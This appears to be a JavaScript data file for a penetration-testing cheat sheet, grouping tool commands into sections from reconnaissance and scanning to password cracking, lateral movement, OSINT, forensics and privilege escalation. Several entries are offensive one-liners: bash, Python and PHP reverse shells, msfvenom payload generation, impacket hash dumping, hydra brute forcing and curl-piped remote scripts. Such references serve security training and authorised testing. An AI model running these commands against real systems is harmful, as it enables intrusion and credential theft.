const SECTIONS = [
  {
    id: 'recon',
    emoji: '\u{1F50D}',
    title: 'Reconnaissance',
    commands: [
      { title: 'nmap — Basic scan', desc: 'Default scan on target IP', diff: 'easy', code: 'nmap <target>' },
      { title: 'nmap — TCP SYN scan', desc: 'Stealth scan without completing TCP handshake', diff: 'easy', code: 'nmap -sS <target>' },
      { title: 'nmap — Specific port', desc: 'Scan a single port', diff: 'easy', code: 'nmap -p <port> <target>' },
      { title: 'nmap — Port range', desc: 'Scan a range of ports', diff: 'easy', code: 'nmap -p <start>-<end> <target>' },
      { title: 'nmap — All ports', desc: 'Full 65535 port TCP scan', diff: 'medium', code: 'nmap -p- -sC -sV -T4 <target>' },
      { title: 'nmap — UDP scan', desc: 'Scan common UDP ports', diff: 'medium', code: 'nmap -sU --top-ports 100 <target>' },
      { title: 'nmap — Service detection', desc: 'Identify service versions on open ports', diff: 'easy', code: 'nmap -sV <target>' },
      { title: 'nmap — OS detection', desc: 'Determine target operating system', diff: 'medium', code: 'nmap -O <target>' },
      { title: 'nmap — Aggressive scan', desc: 'OS + version + scripts + traceroute', diff: 'medium', code: 'nmap -A <target>' },
      { title: 'nmap — Ping sweep', desc: 'Discover live hosts on subnet', diff: 'easy', code: 'nmap -sn <subnet>' },
      { title: 'nmap — Scan subnet', desc: 'Scan all devices in CIDR range', diff: 'easy', code: 'nmap <subnet>' },
      { title: 'nmap — Multiple hosts', desc: 'Scan several targets at once', diff: 'easy', code: 'nmap <target1> <target2>' },
      { title: 'nmap — Verbose output', desc: 'Detailed scan progress', diff: 'easy', code: 'nmap -v <target>' },
      { title: 'nmap — NSE script', desc: 'Run a specific NSE script', diff: 'medium', code: 'nmap --script <script> <target>' },
      { title: 'nmap — Save TXT', desc: 'Save output to text file', diff: 'easy', code: 'nmap -oN <output> <target>' },
      { title: 'nmap — Save XML', desc: 'Save output to XML file', diff: 'easy', code: 'nmap -oX <output> <target>' },
      { title: 'nmap — All formats', desc: 'Normal, XML, grepable at once', diff: 'easy', code: 'nmap -oA <output> <target>' },
      { title: 'nmap — Timing template', desc: 'Aggressive timing (fast scan)', diff: 'easy', code: 'nmap -T4 <target>' },
      { title: 'nmap — Firewall bypass', desc: 'Skip host discovery (assume host is up)', diff: 'medium', code: 'nmap -Pn <target>' },
      { title: 'nmap — Randomize hosts', desc: 'Scan hosts in random order to evade detection', diff: 'hard', code: 'nmap --randomize-hosts <subnet>' },
      { title: 'nmap — Exclude hosts', desc: 'Exclude specific IPs from scan', diff: 'easy', code: 'nmap --exclude <exclude_ip> <subnet>' },
      { title: 'nmap — Traceroute', desc: 'Show packet route to target', diff: 'medium', code: 'nmap --traceroute <target>' },
      { title: 'nmap — OS fingerprint', desc: 'Combine OS + service version detection', diff: 'medium', code: 'nmap -O -sV <target>' },
      { title: 'nmap — DNS enumeration', desc: 'List hosts without scanning them', diff: 'medium', code: 'nmap -sL <subnet>' },
      { title: 'nmap — Version all', desc: 'Detect all possible services aggressively', diff: 'hard', code: 'nmap -sV --version-all <target>' },
      { title: 'whois', desc: 'Domain registration info', diff: null, code: 'whois <domain>' },
      { title: 'dnsrecon', desc: 'DNS enumeration', diff: null, code: 'dnsrecon -d <domain>' },
      { title: 'dig — TXT records', desc: 'Check SPF, DKIM, DMARC', diff: null, code: 'dig <domain> TXT' },
    ]
  },
  {
    id: 'scanning',
    emoji: '\u{1F4E1}',
    title: 'Scanning & Enumeration',
    commands: [
      { title: 'gobuster — Directory bruteforce', desc: 'Common web directories', diff: null, code: 'gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt' },
      { title: 'gobuster — Subdomains', desc: 'DNS subdomain enumeration', diff: null, code: 'gobuster dns -d <domain> -w <wordlist>' },
      { title: 'ffuf — Fast web fuzzing', desc: 'Directory busting with filters', diff: null, code: 'ffuf -u <url>/FUZZ -w <wordlist> -mc 200,301,302' },
      { title: 'ffuf — Recursive', desc: 'Deep directory bruteforce', diff: 'medium', code: 'ffuf -recursion -recursion-depth 3 -u <url>/FUZZ -w <wordlist>' },
      { title: 'nikto', desc: 'Web server vulnerability scan', diff: null, code: 'nikto -h <target>' },
      { title: 'whatweb', desc: 'CMS, framework, version detection', diff: null, code: 'whatweb <url>' },
      { title: 'wpscan', desc: 'WordPress vulnerability scanner', diff: null, code: 'wpscan --url <url> --enumerate' },
      { title: 'masscan — Basic port scan', desc: 'Single port on target', diff: 'easy', code: 'masscan <target> -p <port>' },
      { title: 'masscan — Multiple ports', desc: 'Scan specific ports', diff: 'easy', code: 'masscan <target> -p <port1>,<port2>,<port3>' },
      { title: 'masscan — Port range', desc: 'Scan a range of ports', diff: 'easy', code: 'masscan <target> -p <start>-<end>' },
      { title: 'masscan — Subnet', desc: 'Scan subnet for specific port', diff: 'easy', code: 'masscan <subnet> -p <port>' },
      { title: 'masscan — All ports', desc: 'Full 65535 TCP port scan', diff: 'medium', code: 'masscan <target> -p 0-65535' },
      { title: 'masscan — Set rate', desc: 'Control packets per second', diff: 'medium', code: 'masscan <subnet> -p <port> --rate <rate>' },
      { title: 'masscan — Banner grab', desc: 'Retrieve service banners', diff: 'medium', code: 'masscan <subnet> -p <port> --banners' },
      { title: 'masscan — Save TXT', desc: 'List format output', diff: 'easy', code: 'masscan <subnet> -p <port> -oL <output>' },
      { title: 'masscan — Save XML', desc: 'XML output', diff: 'easy', code: 'masscan <subnet> -p <port> -oX <output>' },
      { title: 'masscan — Save JSON', desc: 'JSON output', diff: 'easy', code: 'masscan <subnet> -p <port> -oJ <output>' },
      { title: 'masscan — Save grepable', desc: 'Grepable output', diff: 'easy', code: 'masscan <subnet> -p <port> -oG <output>' },
      { title: 'masscan — Exclude IP', desc: 'Skip specific target', diff: 'easy', code: 'masscan <subnet> -p <port> --exclude <exclude_ip>' },
      { title: 'masscan — Exclude file', desc: 'Exclude IPs from file', diff: 'medium', code: 'masscan <subnet> -p <port> --excludefile <file>' },
      { title: 'masscan — Interface', desc: 'Bind to specific NIC', diff: 'medium', code: 'masscan <subnet> -p <port> -e <interface>' },
      { title: 'masscan — Source IP', desc: 'Spoof source address', diff: 'hard', code: 'masscan <subnet> -p <port> --source-ip <ip>' },
      { title: 'masscan — Randomize', desc: 'Randomize target order', diff: 'medium', code: 'masscan <subnet> -p <port> --randomize-hosts' },
      { title: 'masscan — Config file', desc: 'Load scan configuration', diff: 'medium', code: 'masscan -c <config>' },
      { title: 'masscan — Resume scan', desc: 'Resume paused scan', diff: 'medium', code: 'masscan --resume <config>' },
      { title: 'masscan — ICMP ping', desc: 'Discover live hosts', diff: 'easy', code: 'masscan <subnet> --ping' },
      { title: 'masscan — Open only', desc: 'Show only open ports', diff: 'easy', code: 'masscan <subnet> -p <port> --open-only' },
      { title: 'masscan — Retries', desc: 'Set retry count for probes', diff: 'medium', code: 'masscan <subnet> -p <port> --retries <count>' },
    ]
  },
  {
    id: 'web',
    emoji: '\u{1F310}',
    title: 'Web Exploitation',
    commands: [
      { title: 'sqlmap — Basic', desc: 'Auto-detect and exploit SQLi', diff: null, code: 'sqlmap -u "<url>?param=1" --batch' },
      { title: 'sqlmap — Dump database', desc: 'Extract all tables', diff: null, code: 'sqlmap -u "<url>?param=1" --dump --batch' },
      { title: 'curl — Basic request', desc: 'View response headers and body', diff: null, code: 'curl -iv <url>' },
      { title: 'curl — POST with data', desc: 'Send form/data to endpoint', diff: null, code: 'curl -X POST -d "user=admin&pass=test" <url>' },
      { title: 'curl — Custom headers', desc: 'Add auth cookies, user-agent', diff: null, code: 'curl -H "Authorization: Bearer <token>" -H "User-Agent: Mozilla/5.0" <url>' },
    ]
  },
  {
    id: 'exploit',
    emoji: '\u{1F5A5}',
    title: 'Exploitation Frameworks',
    commands: [
      { title: 'msfconsole — Search + Use', desc: 'Find and load an exploit', diff: null, code: [
        'msfconsole',
        '  search <cve or name>',
        '  use <module>',
        '  show options',
        '  set RHOSTS <target>',
        '  run',
      ]},
      { title: 'msfvenom — Reverse shell payload', desc: 'Generate staged payload', diff: null, code: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o payload.elf' },
      { title: 'msfvenom — Windows meterpreter', desc: 'Meterpreter reverse TCP', diff: null, code: 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe' },
      { title: 'msfvenom — Web shell', desc: 'PHP reverse shell', diff: null, code: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -o shell.php' },
      { title: 'searchsploit', desc: 'Search Exploit-DB locally', diff: null, code: 'searchsploit <keyword>' },
    ]
  },
  {
    id: 'password',
    emoji: '\u{1F511}',
    title: 'Password Cracking',
    commands: [
      { title: 'hashcat — Identify hash', desc: 'Auto-detect hash type', diff: null, code: 'hashcat --identify hash.txt' },
      { title: 'hashcat — Dictionary attack', desc: 'MD5 with rockyou', diff: null, code: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt' },
      { title: 'hashcat — NTLM', desc: 'Windows NTLM hash', diff: null, code: 'hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt' },
      { title: 'hashcat — bcrypt', desc: 'Slow hash, low speed expected', diff: null, code: 'hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt' },
      { title: 'john — Unshadow', desc: 'Combine passwd + shadow for cracking', diff: null, code: [
        'unshadow passwd shadow > hashes.txt',
        'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
      ]},
      { title: 'hydra — SSH brute force', desc: 'SSH password attack', diff: null, code: 'hydra -l <user> -P <wordlist> <target> ssh' },
      { title: 'hydra — Web form', desc: 'POST login bruteforce', diff: 'hard', code: 'hydra -l <user> -P <wordlist> <target> http-post-form "/path:user=^USER^&pass=^PASS^:F=incorrect"' },
    ]
  },
  {
    id: 'shells',
    emoji: '\u{1F41A}',
    title: 'Reverse Shells & Listeners',
    commands: [
      { title: 'netcat — Listener', desc: 'Basic reverse shell listener', diff: null, code: 'nc -lvnp <port>' },
      { title: 'Bash reverse shell', desc: 'One-liner for Linux targets', diff: null, code: 'bash -c \'bash -i >& /dev/tcp/<ip>/<port> 0>&1\'' },
      { title: 'Python reverse shell', desc: 'Python3 one-liner', diff: null, code: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
      { title: 'PHP reverse shell', desc: 'Web shell via PHP', diff: null, code: 'php -r \'$s=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
      { title: 'Python HTTP server', desc: 'Quick file transfer server', diff: null, code: 'python3 -m http.server <port>' },
      { title: 'socat — Full TTY', desc: 'Fully interactive TTY shell', diff: 'hard', code: [
        '# listener:',
        'socat file:`tty`,raw,echo=0 TCP-LISTEN:<port>',
        '# target:',
        'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane TCP:<ip>:<port>',
      ]},
      { title: 'Upgrade shell — Python', desc: 'PTY upgrade after netcat', diff: null, code: [
        'python3 -c \'import pty;pty.spawn("/bin/bash")\'',
        'Ctrl+Z',
        'stty raw -echo; fg',
        'reset; export TERM=xterm',
      ]},
    ]
  },
  {
    id: 'lateral',
    emoji: '\u{1F504}',
    title: 'Lateral Movement',
    commands: [
      { title: 'impacket — psexec', desc: 'Execute as admin on Windows', diff: null, code: 'impacket-psexec <domain>/<user>:<pass>@<target>' },
      { title: 'impacket — wmiexec', desc: 'WMI execution (subtle)', diff: null, code: 'impacket-wmiexec <domain>/<user>:<pass>@<target>' },
      { title: 'impacket — secretsdump', desc: 'Dump hashes from DC', diff: null, code: 'impacket-secretsdump <domain>/<user>:<pass>@<target>' },
      { title: 'evil-winrm', desc: 'WinRM shell session', diff: null, code: 'evil-winrm -i <target> -u <user> -p <pass>' },
      { title: 'smbclient', desc: 'List SMB shares anonymously', diff: null, code: 'smbclient -L //<target> -N' },
      { title: 'ssh — Tunnel', desc: 'Local port forward through SSH', diff: null, code: 'ssh -L <local_port>:<remote_host>:<remote_port> <user>@<jump_host>' },
    ]
  },
  {
    id: 'osint',
    emoji: '\u{1F575}',
    title: 'OSINT',
    commands: [
      { title: 'theHarvester', desc: 'Email, domain, subdomain enumeration', diff: 'easy', code: 'theHarvester -d <domain> -b google,bing,linkedin' },
      { title: 'sherlock', desc: 'Find username across social networks', diff: 'easy', code: 'sherlock <username>' },
      { title: 'shodan', desc: 'Search for internet-connected devices', diff: 'medium', code: 'shodan search "port:22 country:US"' },
      { title: 'google dorks', desc: 'Google search operators for info gathering', diff: 'easy', code: [
        'site:target.com filetype:pdf',
        'intitle:"index of" password',
        'inurl:admin intitle:"login"',
      ]},
      { title: 'waybackurls', desc: 'Get historical URLs from Wayback Machine', diff: 'easy', code: 'waybackurls <domain>' },
      { title: 'holehe', desc: 'Check if email is used on services', diff: 'easy', code: 'holehe <email>' },
    ]
  },
  {
    id: 'forensics',
    emoji: '\u{1F52C}',
    title: 'Forensics',
    commands: [
      { title: 'autopsy', desc: 'GUI forensic browser', diff: 'medium', code: 'autopsy' },
      { title: 'volatility — Image info', desc: 'Get memory dump profile', diff: 'hard', code: 'volatility -f memory.dump imageinfo' },
      { title: 'volatility — Processes', desc: 'List running processes from dump', diff: 'hard', code: 'volatility -f memory.dump --profile=<profile> pslist' },
      { title: 'foremost', desc: 'Recover files by headers/footers', diff: 'medium', code: 'foremost -i disk.img -o output/' },
      { title: 'bulk_extractor', desc: 'Carve emails, credit cards from images', diff: 'easy', code: 'bulk_extractor -o output/ image.dd' },
      { title: 'exiftool', desc: 'Read file metadata', diff: 'easy', code: 'exiftool <file>' },
    ]
  },
  {
    id: 'cloud',
    emoji: '\u{2601}\u{FE0F}',
    title: 'Cloud & Active Directory',
    commands: [
      { title: 'aws — S3 ls', desc: 'List S3 buckets accessible', diff: 'easy', code: 'aws s3 ls --no-sign-request' },
      { title: 'aws — List bucket contents', desc: 'Enumerate S3 bucket objects', diff: 'easy', code: 'aws s3 ls s3://<bucket> --no-sign-request --recursive' },
      { title: 's3scanner', desc: 'Find open S3 buckets', diff: 'medium', code: 's3scanner --bucket <bucket>' },
      { title: 'BloodHound', desc: 'AD privilege escalation path analysis', diff: 'hard', code: [
        '# Collect data on DC:',
        'bloodhound-python -d <domain> -u <user> -p <pass> -c All -ns <dc_ip>',
        '# Then load the JSON files into BloodHound GUI',
      ]},
      { title: 'kerbrute', desc: 'Kerberos user enumeration', diff: 'medium', code: 'kerbrute userenum -d <domain> <userlist> --dc <dc_ip>' },
      { title: 'GetNPUsers — AS-REP roast', desc: 'Find users without Kerberos pre-auth', diff: 'hard', code: 'impacket-GetNPUsers <domain>/<user>:<pass> -outputfile hashes.txt' },
    ]
  },
  {
    id: 'privesc',
    emoji: '\u{2B06}',
    title: 'Privilege Escalation',
    commands: [
      { title: 'sudo -l', desc: 'List sudo privileges', diff: 'easy', code: 'sudo -l' },
      { title: 'SUID files', desc: 'Find setuid binaries', diff: 'easy', code: 'find / -perm -4000 -type f 2>/dev/null' },
      { title: 'writable scripts in PATH', desc: 'Hijack a script executed by root', diff: 'medium', code: 'find / -writable -type f 2>/dev/null | xargs ls -la' },
      { title: 'cron jobs', desc: 'List scheduled tasks', diff: 'medium', code: [
        'ls -la /etc/cron*',
        'cat /etc/crontab',
        'cat /var/spool/cron/crontabs/<user>',
      ]},
      { title: 'kernel exploit (LES)', desc: 'Linux Exploit Suggester', diff: 'hard', code: 'curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash' },
      { title: 'Windows — Service permissions', desc: 'Check for weak service ACLs', diff: 'hard', code: [
        'accesschk.exe -uwcqv <user> *',
        '# or with PowerShell:',
        'Get-Service | Where { $_.CanStopAndUninstall }',
      ]},
    ]
  },
  {
    id: 'crypto',
    emoji: '\u{1F510}',
    title: 'Cryptography & Encoding',
    commands: [
      { title: 'openssl — Generate RSA key pair', desc: '2048-bit private/public', diff: null, code: [
        'openssl genrsa -out private.pem 2048',
        'openssl rsa -in private.pem -pubout > public.pem',
      ]},
      { title: 'openssl — Self-signed cert', desc: 'For HTTPS testing', diff: null, code: 'openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes' },
      { title: 'Base64 — Encode/Decode', desc: 'Shell one-liners', diff: null, code: [
        'echo -n "<text>" | base64    # encode',
        'echo "<base64>" | base64 -d  # decode',
      ]},
      { title: 'xxd — Hex dump / unhex', desc: 'Binary to hex and back', diff: null, code: [
        'xxd <file>              # hex dump',
        'xxd -r -p <hex.txt>     # hex to binary',
      ]},
    ]
  },
  {
    id: 'misc',
    emoji: '\u{1F9F0}',
    title: 'Misc Utilities',
    commands: [
      { title: 'linpeas — Linux privesc', desc: 'Auto-enumeration script for Linux', diff: null, code: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
      { title: 'winpeas — Windows privesc', desc: 'Auto-enumeration for Windows', diff: null, code: [
        'curl -L -o winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasx64.exe',
        '.\\winpeas.exe',
      ]},
      { title: 'steghide', desc: 'Extract hidden data from image', diff: null, code: 'steghide extract -sf image.jpg' },
      { title: 'binwalk', desc: 'Extract files from firmware/binaries', diff: null, code: 'binwalk --dd=".*" firmware.bin' },
      { title: 'strings', desc: 'Extract readable text from binary', diff: null, code: 'strings <file> | grep -i "flag\\|password\\|secret"' },
    ]
  },
];
